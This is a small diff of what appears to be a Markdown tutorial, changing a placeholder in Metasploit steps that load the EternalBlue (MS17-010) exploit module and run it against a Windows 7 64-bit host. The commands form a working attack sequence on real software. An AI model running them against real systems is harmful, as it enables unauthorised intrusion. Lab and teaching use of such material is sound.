@@ -40,7 +40,7 @@ use exploit/windows/smb/ms17_010_eternalblue ```
 show options
 ``` 
 ```
-set RHOST < Rhost-id > 
+set RHOST “Dirección IP del host windows 7 64bits” 
 ```
 ```
 exploit 
